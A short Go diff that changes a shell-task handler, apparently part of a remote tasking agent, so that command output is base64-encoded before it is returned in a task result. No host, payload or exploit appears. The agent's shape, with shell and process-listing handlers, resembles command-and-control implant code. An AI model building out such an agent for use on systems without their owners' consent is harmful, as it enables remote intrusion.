@@ -17,7 +17,10 @@ func handleShell(task Task, res *TaskResult) {
 	if err != nil {
 		res.Error = err.Error()
 	}
-	res.Output = out
+	if out != "" {
+		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+		res.Encoding = "base64"
+	}
 }
 
 func handlePS(task Task, res *TaskResult) {
